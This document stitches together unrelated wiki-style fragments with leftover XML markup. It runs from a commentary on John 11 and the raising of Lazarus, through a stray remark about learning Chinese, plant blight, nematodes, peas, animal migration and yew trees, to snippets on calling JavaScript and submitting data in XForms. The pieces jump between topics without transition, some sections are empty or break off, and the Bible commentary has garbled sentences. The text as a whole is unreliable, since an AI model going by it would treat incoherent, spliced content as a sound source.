First, we must know the context in which this verse occurs. In the beginning of the chapter Mary and Martha, the sisters of Lazarus, send word of their brother's illness to Jesus. Four days after Lazarus's death Jesus finally arrived. Martha went to talk to Jesus and He said to her &quot;Your brother shall rise again&quot; (verse 23 NAS) but, she seems to already know of this resurrection of the last day. (verse 24) Martha goes to get her sister and Jesus sees how distraught they were as they wept. When He seen their grief He &quot;was troubled&quot; (verse 33 NAS) He then asked where they had laid Lazarus (verse 34) and went to see. This is when, Jesus wept. He weeps in front of Lazarus's tomb and &quot;the Jews were saying 'Behold how He loved him!'&quot; (verse 36 NAS) However, others became spectacle of His miracle and began questioning. (verse 38) Jesus then declares the people to remove the stone and then prayed to God. He prayed to God in the interest of the people so that &quot;they may believe that Thou didst send Me.&quot; (verse 42 NAS) After this, Jesus orders: &quot;Lazarus, come forth.&quot; (verse 43 NAS) His friend rose from the grove. Another miracle!   

Now that the context of the verse has been established, one can make their own conclusions on the following theories and maybe even construct their own. 

One theory is that Jesus wept to reveal that He was indeed a true man with physical bodily functions just like any other human. This would then in return expel the idea of Docetism which is a belief that he was actually a spirit and not physically real. (more information on this belief can be found in a Catholic Encyclopedia- [http://www.newadvent.org/cathen/index.html])

Weeping for Lazarus could just be a result from the simple fact that Lazarus was indeed dead. After all, Lazarus was the one &quot;whom Jesus loved&quot; so the reason is clear and obvious. (verse 3 NAS) 

Another theory researched by L. Morris in ''John'' (558) is the idea that Jesus was actually weeping for those closest to Him, such as his disciples and Mary and Martha, were still blinded and did not believe what Jesus told them in verses 25 and 26 (NAS) &quot;I am the resurrection and the life; he who believes in Me shall liven even if he dies, and everyone who lives and believes in Me shall never die...&quot; 

There is also and idea that His grief was for the events to come. Jesus is known to have divine knowledge even that of the after life. With that said, some believe that Jesus wept because He knew that He would resurrect Lazarus, the one whom He loved (verse 3). With that said, Jesus was sad because Lazarus would have to leave paradise (Luke 23:43) and return to the imperfect and evil world.

'''&quot;Reaction of the raising of Lazarus&quot;'''
The raising of Lazarus is the climax of the series of 'signs': whatever doubts they might have had before, Jesus' divine glory was evident (verse 40). It is not surprising that many believed in Jesus.  In verse 31, two groups of people with very different intentions are included in 'The Jews who had come with Mary'.  One group, the consoling group, were those who presumably left her house and followed her 'thinking she was going to the tomb to weep there' (v. 31).  The other group, who had less friendly intentions, had a different reaction. As soon as they saw what Jesus had done they went off and told the Pharisees (verse 46).

The raising of Lazarus in not found in the synoptic gospels; however, there are connectoins between this scene and the synoptic trial of Jesus.  The raising had the same reaction many other miracle stories had.  This included both positive, and then negative ractions.  Furthermore, a meeting of the council of Sanhedrin was called to figure out what to do about Jesus.  &quot;With this hearing the wheels are set in motion that will eventually carry Jesus to his death.  Jesus gives life and his enemies decide to put him to death,&quot; (Smith 216).


== Chapter 11:1-54 ==
The raising of Lazarus is the seventh sign that illustrates Jesus is the one who gives life.  Raising Lazarus from the dead signifies to us that Jesus beats death.  Ironically, by giving life to Lazarus, Jesus puts in motion his own death.  It is the final sign before the crucifixion, which shows us life comes through the death of the Son of God.

Starting from verse 1 in John Chapter 11, Jesus is informed that a man (whom he dearly loves) named Lazarus is very sick.  Jesus, once again showing his perfect foreknowledge, tells his disciples that Lazarus' sickness will not end in death.  More important to his disciples however, is the notion of returning to Judea (Jesus was nearly stoned there).  It is here that Jesus once again utilizes the symbols of light and darkness.  &quot; Are there not twelve hours of daylight?  A man who walks by day will not stumble, for he sees by this world's light.  It is when he walks by night that he stumbles, for he has no light&quot; (John Chapter 11 Verses 9, 10).  However, the metaphor does not refer to worldly light.  The light Jesus speaks of is eternal and from God.  More important still is the fact that Jesus has established himself as the light of the world.  Therefore, Jesus is metaphorically asking the question:  &quot;Do you really think that I (God incarnate) am going to stumble and fall to the stones of men?&quot;  The question is one of faith, and Jesus makes this painfully clear in Verse 11:  &quot;...'Our friend Lazarus has fallen asleep; but I am going there to wake him up.&quot;   With this statement Jesus clearly signals to his disciples that he is going to Judea and that they are to come with him. The disciples, however, misunderstand Jesus. They believe Jesus is talking about Lazarus actually sleeping. Jesus sets them straight, and lets them know that Lazarus is, in fact, dead. He also says that he is glad he was not with Lazarus while he died. Jesus would rather go to Lazarus and raise him from the dead in order to show the disciples who he truly is than stop Lazarus from dying in the first place. The disciples might not understand exactly what the purpose of the trip is. Thomas  makes a joke that refers to being killed when they step foot in Judea again.

There is a fascinating exchange that takes place in verses 24-26, &quot;Martha said to him, 'I know that he will rise again in the resurrection on the last day.' Jesus said to her, 'I am the resurrection and the life.  Those who believe in me, even though they die, will live, and everyone who lives and believes in me will never die.'&quot;  In verse 24 when Martha says, &quot;he will rise again in the resurrection on the last day.&quot; this presumably reflects the traditional Jewish understanding that all people will eventually be resurrected, and yet Jesus seems to turn this belief on its head with his response, as perplexing as it is.  Instead of confirming what Martha says Jesus utters a similar, albeit less famous, remark as found in John 3:16.  The wording is odd however, and depending on the translation can be somewhat hard to understand.  Is Jesus saying that you can believe in him even after you die, and that you will never die if you believe in him while still alive?  It seems clear that this was not his intent.  Moody Smith offers a different interpretation that seems to clarify the passage, &quot;Whoever believes in Jesus, although he will die, will nevertheless live; that is, whoever while living in this world believes, will not die with respect to the next.&quot;  John then is talking about physical death and spiritual life.

== John 11:55-57 == In this passage the festival of Passover is taking place and all the people are wondering if Jesus will show up. The chief priests and Pharisees order them to disclose his whereabouts if they find him or run into him so that they might seize him. According to William Barclay, many Jews come early to this festival to be purified because according to the law every man is bound to purify himself before the feast, in order to ensure ceremonial cleanliness. However, as stated in Chronicles13:19, Jesus was in a town called Ephraim, near Bethel, doing his work. For this reason the Jews did not know if he would come. According to commentator L.L. Speer, it was thought that the reason that Jesus was late was because his friends may have known of the Pharisees’ plans and warned Jesus of what was to happen. Nonetheless, Jesus came, and because of this was considered a very brave outlaw of his time.

This chapter shows both the humanness and the divinity of Jesus.  Jesus shows his humanness when he weeps with the other mourners in Bethany.  Jesus shows his divinity by raising Lazarus from the dead and showing God's glory to those present.

'''Tone in John Chapter 11'''  One of the most interesting verses for an interpretation of tone is found in John Chapter 11: &quot;Then Thomas (called Didymus) said to the rest of the disciples, 'Let us also go, that we may die with him.'&quot; (verse 16).  This remark is made when Christ decides to return to Judea (where the climate is not exactly receptive to His presence) in order to raise Lazarus from the dead.  Tone becomes important here because it is very easy to read Thomas' statement in a few different ways: 1) that of a servant willing to follow His master to whatever end, and 2) A bit of sarcasm could be present, which would read something like 'Well, if He wants to commit suicide, I guess we better go too.&quot;  Tone is such an important issue here and in so many places in the Bible, yet it is nearly impossible to glean from the text itself.  We rely on the authors of books describing emotional states, rather than analyzing the words themselves to glean manner of delivery.

It would be very cool if he had Listening Comprehension exercises.  However, I am just learning Chinese so my pronunciation is not very good.  Are there any fluent/native speakers here that can make up some sentences from the vocabulary in dialog 1?

      <text xml:space="preserve">'''Blight''' refers to a specific symptom that can be expressed by plants in response to infection by a plant pathogenic organism.  It is simply a rapid and complete chlorosis, browning, then death of plant tissues such as leaves, branches, twigs, or floral organs.&lt;ref&gt;Agrios, George N. &lt;u&gt;Plant Pathology&lt;/u&gt;. 5th ed. Burlington, MA: Elsevier Academic Press, 2005.&lt;/ref&gt;  Accordingly, many diseases that primarily exhibit this symptom are called '''blights'''. Several notable examples are:
[[Image:Brown Felt Blight.jpg|thumb|right|300px|Brown felt blight on mugo pine]]
* Late blight of potato, caused by the water mold ''[[../Phytophthora infestans/]]'' (Mont.) de Bary, the disease which led to the Irish Potato famine
* Southern corn leaf blight, caused by the fungus ''Cochliobolus heterostrophus'' (Drechs.) Drechs, anamorph ''Bipolaris maydis'' (Nisikado &amp; Miyake) Shoemaker, incited a severe loss of corn in the United States in 1970.&lt;ref&gt;Partridge, J.E. &quot;Southern Corn Leaf Blight.&quot; 2003. 8 August 2006. http://nu-distance.unl.edu/homer/disease/agron/corn/CoSCLB.html&lt;/ref&gt; &lt;br /&gt;
* [[w:Chestnut blight|Chestnut blight]], caused by the fungus ''[[../Cryphonectria parasitica/]]'''' (Murrill) Barr, has nearly completely eradicated mature [[American chestnut]]s in North America.
* [[w:Fireblight|Fireblight]], caused by the bacterium ''[[../Erwinia amylovora/]]'' (Burrill) Winslow ''et al.'', is the most severe disease of pear and also is found in apple and raspberry, among others.
* Bacterial leaf blight of rice, caused by the bacterium ''Xanthomonas oryzae'' (Uyeda &amp; Ishiyama) Dowson.&lt;ref&gt;Oda, M., Sekizawa, Y., and Watanabe, T. 1966. &quot;Phenazines as Disinfectants Against Bacterial Leaf Blight of the Rice Plant.&quot; Applied Microbiology 14(3):365-367.&lt;/ref&gt; &lt;br /&gt; 
* Early blight of potato and tomato, caused by species of the ubiquitous fungal genus ''[[../Alternaria/]]''
* Rubber leaf blight
On leaf tissue, symptoms of '''blight''' are characterized by the initial appearance of lesions which rapidly engulf surrounding tissue. However, lesions of diseases that cause [[../Leaf Spots|leaf spots]] may, in advanced stages, expand to kill entire areas of leaf tissue and thus exhibit blight symptoms.

he '''nematodes''' or '''roundworms''' (Phylum '''Nematoda''' from Greek νῆμα (nema): &quot;thread&quot; + -ώδη (-ode) &quot;like&quot;) are one of the most common phyla of animals, with over 20,000 different described species (over 15,000 are parasitic). They are ubiquitous in freshwater, marine, and terrestrial environments, where they often outnumber other animals in both individual and species counts, and are found in locations as diverse as Antarctica and oceanic trenches. Further, there are a great many parasitic forms, including pathogens in most plants and animals, humans included. Only the Arthropoda are more diverse.

==Abundance==
Nematodes have successfully adapted to nearly every ecological niche from marine to fresh water, from the polar regions to the tropics, as well as the highest to the lowest of elevations. Though 20,000 species have been classified it is estimated that this number may be upwards of 500,000 if all were known.&lt;ref&gt;{{cite book |last= Hyman |first= L.H. |title=The invertebrates, vol. III. Acanthocephala, Aschelminthes, and Entoprocta, the pseudocoelomate Bilateria. |publisher= Mc Graw Hill |location= New York|isbn=0070316619}}&lt;/ref&gt;. In certain fertile areas the topsoil is estimated to contain in the billions of nematodes per acre.&lt;ref name=&quot;hickman&quot;&gt;{{cite book |last= Hickman |first= Cleveland  |coauthors= Roberts L. Keen S. Larson A. Eisenhour D|title= Animal Diversity |edition= 4th |publisher= Mc Graw Hill |location= New York|language= English |isbn= 978-0-07-252844-2}}&lt;/ref&gt; In the 1914 edition of the Yearbook of the United States Department of Agriculture N.A.Cobb wrote on the abundance of nematodes&lt;ref name=&quot;hickman&quot;/&gt;: &quot;If all the matter in the universe except the nematodes were swept away, our world would still be dimly recognizable, and if, as disembodied spirits, we could then investigate it, we should find its mountains, hills, vales, rivers, lakes and oceans represented by a thin film of nematodes. The location of towns would be decipherable, since for every massing of human beings there would be a corresponding massing of certain nematodes. Trees would still stand in ghostly rows representing our streets and highways. The location of the various plants and animals would still be decipherable, and, had we sufficient knowledge, in many cases even their species could be determined by an examination of their erstwhile nematode parasites.&quot;

==Morphology==
Nematodes are unsegmented, thin and are round in cross section. They have no circulatory or respiratory systems so they use diffusion to breathe and for circulation of substances around their body. Nematodes are one of the simplest animal groups to have a complete digestive system, with a separate orifice for food intake and waste excretion, a pattern followed by all subsequent, more complex animals. The body cavity lacks the muscles of coelomate animals used to force food down the digestive tract. Nematodes thus depend on internal/external pressures and body movement to move food through their digestive tracts. The mouth is often surrounded by various flaps or projections used in feeding and sensation. The portion of the body past the anus is called the &quot;tail.&quot; As they grow, their cells get larger, but the total number is constant. The epidermis secretes a layered cuticle made of three layers of collagen&lt;ref name=&quot;hickman&quot;/&gt; that protects the body from drying out, or from digestive juices or other damaging substances. Although this cuticle allows movement and shape changes, it is very inelastic so does not allow the volume of the worm to increase. Therefore, as the worm grows, it has to molt and form new cuticles. The cuticles don't allow volume to increase so as to keep hydrostatic pressure inside the organism very high. For this reason, the roundworms do not possess circular muscles (just longitudinal ones) as they're not required. This hydrostatic pressure is the reason the roundworms are round.

Most free-living nematodes are microscopic, though a few parasitic forms can grow to over a meter in length (typically as parasites of very large animals such as whales). 

Most nematodes eat bacteria, fungi and protozoans, although some are filter feeders. Excretion is through a separate excretory pore.

Nematodes have a simple nervous system, with a main nerve cord running along the ventral side. 

==Free-living species==
In free-living species, development usually consists of four molts of the cuticle during growth.  Different species feed on materials as varied as algae, fungi, small animals, fecal matter, dead organisms and living tissues. One roundworm of note is ''Caenorhabditis elegans'', which lives in the soil and has found much use as a model organism.  ''C. elegans'' has had its entire genome sequenced, as well as the developmental fate of every cell determined, and every neuron mapped.

==Parasitic species==

Nematodes that are parasitic on animals often have quite complicated life cycles, moving between several different hosts or locations in the host's body.  Infection occurs variously by eating uncooked meat with larvae in it, by entrance into unprotected cuts or directly through the skin, by transfer via blood-sucking insects, etc. 

In contrast, entomopathogenic nematodes parasitize insects and are considered by humans to be beneficial.

One form of nematode is entirely dependent upon the wasps which are the sole source of fig fertilization. They prey upon the wasps, riding them from the ripe fig of the wasp's birth to the fig flower of its death, where they kill the wasp, and their offspring await the birth of the next generation of wasps as the fig ripens. 

Plant parasitic nematodes include several groups causing severe crop losses. The most common genera are: ''Aphelenchoides'' (foliar nematodes), ''Meloidogyne'' (root-knot nematodes), ''Heterodera'', ''Globodera'' (cyst nematodes) such as the [[w:potato root nematode|potato root nematode]], ''Nacobbus'', ''Pratylenchus'' (lesion nematodes), ''Ditylenchus'', ''Xiphinema'', ''Longidorus'', ''Trichodorus''. Several phytoparasitic nematode species cause histological damages to roots, including the formation of visible galls (''Meloidogyne'') which are useful characters for their diagnostic in the field. Some nematode species transmit plant viruses through their feeding activity on roots. One of them is ''Xiphinema index'', vector of GFLV (Grapevine Fanleaf Virus), an important disease of grapes.

Other nematodes attack bark and forest trees. The most important representative of this group is ''Bursaphelenchus xylophilus'', the pine wood nematode, present in Asia and America and recently discovered in Europe.

The largest known nematode is ''Dioctophyma renale'', the giant kidney worm, a parasite most commonly found in mink but also in dogs and humans, that can reach up to 103 cm in length.&lt;ref&gt;{{cite web | title = Giant Kidney Worm Infection in Mink and Dogs | work = The Merck Veterinary Manual | date = 2006 | url = http://www.merckvetmanual.com/mvm/index.jsp?cfile=htm/bc/130506.htm | accessdate = 2007-02-10 }}&lt;/ref&gt;

==Gardening==
[[image:Soybean cyst nematode and egg SEM.jpg|thumb|200px|Soybean cyst nematode and egg]]
Depending on the species, a nematode may be beneficial or detrimental to a gardener's cause.

From a gardening perspective, there are two categories of nematode: predatory ones, which will kill garden pests like cutworms or Japanese beetle grubs, and pest nematodes, like the root-knot nematode, which attack garden plants.

Predatory nematodes can be bred by soaking a specific recipe of leaves and other detritus in water, in a dark, cool place, and can even be purchased as an organic form of pest control.

'''''Pisum''''' is a genus of the family Fabaceae, native to southwest Asia and northeast Africa. ''[[../Pisum sativum/]]'', the field pea or garden pea, is the most commonly cultivated.

==Description==
Tendrilled vines with compound leaves. The flower has 5 sepals (fused), 5 petal, 10 anthers (9 are fused ,1 free) and 2 carpels(fused). The fruit is a legume (the pea).

==Growing conditions==
Sunny locations, soils should be rich but well-drained. Seeds are usually inoculated with a bacteria which fixes atmospheric nitrogen for the use of the plant.

==Varieties==
The genus contains one to five species, depending on taxonomic interpretation; the International Legume Database (ILDIS) accepts three species, one with two subspecies [http://www.ildis.org/LegumeWeb/6.00/names/npall/npall_567.shtml]:
*''[[../Pisum abyssinicum/]]'' ([[synonymy|syn.]] ''P. sativum'' subsp. ''abyssinicum'')
*''[[../Pisum fulvum/]]''
*''[[../Pisum sativum/]]'' - Pea
**''Pisum sativum'' subsp. ''elatius'' (syn. ''P. elatius'', ''P. syriacum'')
**''Pisum sativum'' subsp. ''sativum''

==Uses==
''[[../Pisum sativum/]]'' is commonly grown as a food crop, but all plants in this genus can be used as cover crops.

      <text xml:space="preserve">== Motivation ==
Sometime XForms data elements don't do everything you need.  This is especially true for exception handling.  When this happens you can dynamically load a JavaScript program to handle the required functionality.

This example will use the XForms '''load''' element.  But unlike most JavaScript functions, it will not be loaded into the browser until it is needed.

== Sample Program ==
Here is an example of using the load element within an XForms trigger:

First you will need a small JavaScript funtion to test like the following:

&lt;source lang=&quot;JavaScript&quot;&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
       var MyJavaScript=function(){
          alert('Hello From JavaScript');
       }    
    &lt;/script&gt;
&lt;/source&gt;

Then you can call this JavaScript function using the Load function within a trigger:

&lt;source lang=&quot;xml&quot;&gt;
&lt;xf:trigger&gt;
   &lt;xf:label&gt;Run JavaScript&lt;/xf:label&gt;
   &lt;xf:action ev:event=&quot;DOMActivate&quot;&gt;
      &lt;xf:load resource=&quot;javascript:MyJavaScript()&quot; /&gt;
      ........
   &lt;/xf:action&gt;
&lt;/xf:trigger&gt;
&lt;/source&gt;

[http://xforms-examples.googlecode.com/svn/trunk/13-javascript/call-javascript-from-xforms.xhtml Load XForms Application]

You can also pass data from an XForms instance by using the following example:

&lt;source lang=&quot;JavaScript&quot;&gt;
function myjavascriptfunction(id) {
   // We get the instance element
   var instanceElement = document.getElementById(id);
      if (instanceElement!=null) {
      // XForms exposes the retrieval of the instance document from the model element which *should*
      // be the parent for the instance element.
      var instance = instanceElement.parentNode.getInstanceDocument(id);
      }
}      
&lt;/source&gt;

When the user selects this trigger the JavaScript function my-javascript-function will be dynamically loaded into the XForm application and executed.

This program was inspired by the following example posted by Nicholas Chase, a Freelance writer with Backstop Media.

      <text xml:space="preserve">===Animal Movement===
Predictable fluctuations in environmental conditions impact the behavior and movement patterns of many animals. When northern temperate ponds freeze over in winter, bald eagles are cutoff from their prey, forced to travel in search of open water. Animals respond by travelling to such seasonal changes in carrying capacity by seeking out abundant resources in the summer and emigrating from limited, harsh resource conditions in the winter. '''Migration''' refers to these regular, seasonal journeys of animals that alternate between breeding and non-breeding locations. Many species are able to move great distances and excel at an ability to find their way. A combination of cues and mechanisms are employed to complete some of the most amazing achievements.

===Animal Movements and Tinbergen's Four Aims===
A series of independent questions can be addressed to explore the causation of migratory movements in animals, such as song birds.

'''Proximate Causation''': hormonal influences on timing (restlessness), cues for navigation, ...

'''Ultimate Causation''': For functional explanations of songbird migration, migrants must exceed local residents in the number of offspring, despite making up for additional energy costs and dangers associated with migration.

'''Phylogeny''': Many species of birds migrate. Fossil evidence suggests that early songbirds evolved in the tropics. Migration may have arisen when individuals moved north (or southward) in spring to exploit longer daylight hours, local resource abundance in temperate zones, and release from competition in the tropics during the breeding season with its high food demands. The precise course of current major flyways have probably evolved since the last glaciation.

'''Ontogeny''': learning of migration paths and innate preference for migration direction (European warblers, Starlings)

=====Homing=====
Homing refers to an individual's ability to return from a distant location to the only place it is certain to know something about. Animals may utilize a variety of cues and mechanisms to determine the location of its home site. ''Route reversal'' is a method used by some animals where the outgoing route is memorized/marked so the animal is able to “retrace” its steps by way of reversing the original route. Situations where the outward travel is significantly longer then the return journey, requires an ability to calculate the most direct route back via a diversity of orienting mechanisms, such as vector-based averaging or the acquisition of spatial maps.

Limpets fit their shell to one specific spot on a rock. A close fit is critical to withstand the impact of waves when submerged and prevent desiccation when exposed. Scraping algae from the rock surface, they travel from their home site, leaving behind a chemical trail. By reversing direction on this trail they are able to return to the very site they came from.

[[Image:Homing pigeon.jpg|thumb|200px|right|Homing pigeon]]The homing pigeon has been selectively bred to be able to return to its home over extremely long distances. As a pigeon generally returns to its own nest and its own mate, human handlers have selectively bred subsets of birds that were particularly good at this task. Homing flights from as far as 1000 kilometers have been recorded by exceptional birds at average flying speeds of around 50km/h. For thousands of years humans have used homing pigeons to return messages back to home base by attaching them to the birds legs.

=====Migration=====
Migration includes all movements made in response to changes in food availability, habitat or weather.

'''Nomadic Migration''': Individuals travel from place to place following distributions of resources. Following available forage determined by the season's weather patterns Bison roamed the American Great Plains, wildebeest travel the Serengeti

'''Seasonal Migration''': Travel between a summer area for breeding and an area for overwintering are driving the seasonal migration of many animals, such as song birds. The energetic advantages of breeding in a site of seasonally high food resources and extended daylight hours allow diurnal birds to produce larger clutches than related non-migratory species that remain in the tropics year-round. In autumn, as the days shorten and food sources dwindle, birds return to warmer regions where the available food supply varies little with the season. The success of migrants indicates that these advantages greatly offset the high stress, energetic costs, and other risks of the migration. Cardinals are common winter residents in northern latitudes. As members of a taxon with mostly tropical distribution, they may have reduced their winter return migration.

'''Return Migration''':

===Navigation Mechanisms===

Navigation refers to the ability of planning and controlling one's movement from one place to another. It requires knowing one's current location on earth, the location of the desired goal, and an ability to calculate travel directions to get from here to there.

====Orienting====
Many individuals show a distinct preference for departing in one particular direction. This applies to diurnal movements of plankton that feed at the surface during the evening and night, and sink to lower, darker regions to avoid falling prey to visual predators.

====Dead Reckoning====
Many birds determine a particular flight direction based on environmental cues that serve as landmarks on the Earth's surface, including longitudinally magnetic lines, the lcoation and direction of the sun and other celestial objects, or prevailing wind direction and odors.

In '''vector navigation''' individuals arrive at a given destination by maintaining a compass direction (or directions) for a predetermined amount of time or distance. '''Dead reckoning''' is the process of estimating one’s present position by projecting course and speed from a known past position. Honey bees for instance communicate the location of profitable nectora sources to hive mates. Using a waggle dance they are able to transmit codes for direction and distance.

European Starlings from much of continental Europe overwinter on the channels coast of France and Britain. A group of banded individuals was moved from one part of Europe to a more western geographic location. This transfer would now require a ninety degree change in direction to reach their traditional wintering grounds. Adult starlings were admirably able to perform that course adjustment and returned at their normal wintering range. Newly-hatched juveniles, however, which had never made the trip before, continued to fly their traditional southwesterly direction and ended up on the coast of Spain.

Sahara desert ants (''Cataglyphis'') are scavengers. They forage for the corpses of insects and other arthropods which have succumbed to the heat stress of their desert environment. While no known land animal can live permanently at a temperature over 50°C, Sahara desert ants can sustain a body temperature well above 50°C with surface temperatures of up to 70°C. This ant ventures far from its burrow in the Sahara desert, which has almost no identifiable features. While venturing out it periodically takes measurements of its angle in respect to the Sun. By doing this the ant can venture far from its nest in search of food. Because of the blistering heat, it can only do this for about 3–5 minutes/day (the hottest time of the day, when all its predators are in hiding from the sun). In addition to obtaining information on outwards, directional angles, the ant appears to measure distances using an internal pedometer to count its steps. When the ant finds a dead insect it calculates the shortest route back to the nest through vector averaging.

====Pilotage====
Pilotage includes the use of fixed visual references to guide oneself to a destination. It refines simple dead reckoning navigation by incorporating knowledge of specific landmarks. Tinbergen explored digger wasps's (''Philanthus triangulum'') ability to return to the entrance tunnel of a specific nest site containing a developing larva. The wasp catches bees on hunting trips and returns this food to the offspring. While the wasp was in the burrow, Tinbergen placed a circle of pine cones around the entrance. When the wasp emerged it completed several circles around the entrance area before flying off. Tinbergen then moved the pine cones to the side of the nest and waited for the wasp to return from hunting. Upon return the wasp flew to the center of the pine cone circle even though that had been moved during her absence.

Radar images show that migrating bird flocks drift off courses in a strong crosswind, except for flocks that travel along distinct landmarks, such as rivers, coast lines, or mountain ridges&lt;ref&gt;Biro D, Meade J, &amp; T Guilford. 2004. Familiar route loyalty implies visual pilotage in the homing pigeon. Proc. Nat. Acad. Sc. 101(50), 17440-17443.&lt;/ref&gt;. Landmarks may also arise from specific atmospheric conditions and distinct geographic features, such as Point Pelee, which jutts into Lake Erie and serves as key staging ground for migrating hawks in search of updrafts.

Visual Orientation refers to the use of geographic landmarks (rivers, coastlines, ridges, etc.). Diurnal migrants often follow such landmarks, generally of lesser importance for nocturnal migrants, although there are documented cases of nocturnal migrants following rivers or coastlines. This may be particularly important for navigation to a precise breeding or wintering locality.

====Map-based (True) Navigation====
Map-based navigation refers to an organism’s ability to (1) acquire a mental representation of the spatial layout of its environment, (2) to position itself within it, and (3) to determine its own position relative to a goal location. The individual is able to extrapolate this information about the surrounding even when it finds itself in an unfamiliar setting. Orienting mechanisms include mosaic and gradient maps&lt;ref&gt;Able KP. 2001. The concepts and terminology of bird navigation. J. Avian Biol., 32(2): 174-183&lt;/ref&gt;. A cognitive map refers to an internal representation of the spatial relationships between objects in an animal’s surroundings.

'''Mosaic map navigation''' involves being able to tell what landmarks are around the goal location and how these landmarks are situated relative to each other. Successful orientation is achieved by the use of landmarks and their spatial arrangement&lt;ref&gt;Wiltschko W &amp; R Wiltschko. 1978. A theoretical model for migratory orientation and homing in birds. Oikos, 177-187&lt;/ref&gt;. This generally works better on a small scale and, for many animals, the animal must be in range of its goal in order to make use of the mosaic map. An animal may use landmarks by learning how locations are spaced relative to each other. An animal at Reference Point A may recognize that its goal will be on the left. Alternatively, an animal may sum up vectors such that it learns that Point A is located 20 km distant from Reference Point B.

'''Gradient map navigation''' involves predictable variation in two geophysical gradients that run perpendicular to each (i.e., bi-coordinate map). In this fashion an animal may acquire information about its current x and y coordinates along with knowledge about the x and y values of a destination, allowing it to plot a path from the former to the latter. Examples of gradients may integrate magnetic, olfactory, or infrasound information to do this. A ''magnetic map'' utilizes the Earth’s magnetic field which acts like a large bar magnet&lt;ref&gt;Walker MM &amp; ME Bitterman. 1985. Conditioned responding to magnetic fields by honeybees. J. Comp. Physiol A 157(1): 67-71&lt;/ref&gt;. Consequentially, this allows for any point on Earth to be defined as a vector that is made up of intensity (the length) and direction (the horizontal and vertical components)&lt;ref&gt;Lohmann KJ et al. 2001. Regional magnetic fields as navigational markers for sea turtles. Science 294(5541), 364-366&lt;/ref&gt;. An ''olfactory map'' is formed by certain scents that are typically only found in certain areas on Earth. This may include an area of land that is surrounded by a body of water on three of its four sides (i.e., Italy). An ''infrasound map'' may use low frequency sounds from waves crashing on the beach, mountains nearby, or similar acoustic instances&lt;ref&gt;Hagstrum JT. 2000. Infrasound and the avian navigational map. J. Exp. Biol. 203(7), 1103-1111&lt;/ref&gt;. Pigeons have become disoriented when in a “zone of silence”, possibly due to their need to navigate via an infrasound map. Other animals that are known to take use of low frequency sounds include whales, elephants, and insects. An ''integrated map'' combines a combination of sensory cues in navigational tasks. 

A variety of animals have been shown to use cognitive maps, including sand hoppers, ants, honey bees, lobsters, sting rays, tuna fish, salmon, newts, sea turtles, mole rats, migratory birds (European robins, garden warblers, etc.), pigeons, and sea birds (Wilson’s storm petrels, sooty terns, etc). Indigo Buntings are able to navigate by the position of celestial objects. In order to obtain precise locations they must be able to estimate altitude and azimuth relative to the horizon, in combination with precise timing information.

'''Yews''' are small coniferous trees or shrubs in the yew family (Taxaceae). They are relatively slow growing and can be very long-lived, and reach heights of 1-40 m, with trunk diameters of up to 4 m. All species of yew contain highly poisonous alkaloids known as taxanes, with some variation in the exact formula of the alkaloid between the species. All parts of the tree except the arils contain the alkaloid. The arils are edible and sweet, but the seed is dangerously poisonous, and unlike birds, the human stomach can break down the seed coat and release the taxanes into the body. This can have fatal results if yew 'berries' are eaten without removing the seeds first. Grazing animals, particularly cattle and horses, are also sometimes found dead near yew trees after eating the leaves, though deer are able to break down the poisons and will eat yew foliage freely. In the wild, deer browsing of yews is often so extensive that wild yew trees are commonly restricted to cliffs and other steep slopes inaccessible to deer.

==Description==
They have reddish bark, lanceolate, flat, dark-green leaves 1-4 cm long and 2-3 mm broad, arranged spirally on the stem, but with the leaf bases twisted to align the leaves in two flat rows either side of the stem.

The seed cones are highly modified, each cone containing a single seed 4-7 mm long partly surrounded by a modified scale which develops into a soft, bright red berry-like structure called an aril, 8-15 mm long and wide and open at the end. The arils are mature 6-9 months after pollination, and with the seed contained are eaten by thrushes, waxwings and other birds, which disperse the hard seeds undamaged in their droppings; maturation of the arils is spread over 2-3 months, increasing the chances of successful seed dispersal. The male cones are globose, 3-6 mm diameter, and shed their pollen in early spring. Yews are mostly dioecious, but occasional individuals can be variably monoecious, or change sex with time.

==Growing conditions==
&lt;!--sun, soil, etc.--&gt;

==Species==
All of the yews are very closely related to each other, and some botanists treat them all as subspecies or varieties of just one widespread species; under this treatment, the species name used is ''Taxus baccata'', the first yew described scientifically. 

The most distinct is the Sumatran Yew (''T. sumatrana'', native from Sumatra and Celebes north to southernmost China), distinguished by its sparse, sickle-shaped yellow-green leaves. The Mexican Yew (''T. globosa'', native to eastern Mexico south to Honduras) is also relatively distinct with foliage intermediate between Sumatran Yew and the other species. The Florida Yew, Mexican Yew and Pacific Yew are all rare species listed as threatened or endangered.

Yew wood is reddish brown (with whiter sapwood), and is very springy. It was traditionally used to make bows, especially the longbow. Ötzi, the Chalcolithic mummy found in 1991 in the Austrian alps, carried an unfinished longbow made of yew wood. Consequently, it is not surprising that, in Norse mythology, the god of the bow, Ullr's abode had the name Ydalir (Yew dales). Most longbow wood used in northern Europe was imported from the Iberian Peninsula, where climatic conditions are better for growing the knot-free yew wood required. 

Yews are widely used in landscaping and ornamental horticulture. Over 400 cultivars of yews have been named, the vast majority of these being derived from European Yew, Japanese Yew and the hybrid between them (''Taxus x media''). The most popular of these are the &quot;Irish Yew&quot; (''Taxus baccata'' 'Fastigiata'), a fastigiate cultivar of the European Yew, and the several variants with yellow leaves, collectively known as golden yew.

The Pacific Yew ''Taxus brevifolia'', native to the Pacific Northwest of North America, and Canada Yew ''Taxus canadensis'' are the sources of paclitaxel, a chemotherapy drug used in breast  and lung cancer treatments. Over-harvesting of the Pacific Yew for this drug has resulted in it becoming an endangered species, though the drug is now produced semi-synthetically from cultivated yews, without the need to further endanger the wild populations. The more common Canada yew, ''Taxus canadensis'', is also being successfully harvested in northern Ontario, Québec and New Brunswick, and has become another major source of paclitaxel.

XForms works very well when the submit element can insert or update instance data directly into a database.  This feature is supported by most native and hybrid databases.

There are over 30 Native XML databases in use today from both OpenSource and commercial vendors.  One of the large factors that make some easier to integrate with XForms is the availability of a Rest interface so that your submit URL statement can be structured somewhat like this:

&lt;code&gt;&lt;b&gt;
http://www.example.com/application/form/save.xq
&lt;/b/&gt;&lt;/code&gt;

Where save is some XQuery file that has the instructions for saving the XML data into the appropriate table or collection.

      <text xml:space="preserve">== Motivation ==
Since users frequently spend a lot of time entering data, you want to make sure that if you allow them to delete that they didn't accidentally click on the delete or that they have selected the correct element when they do actually delete a part of the form.

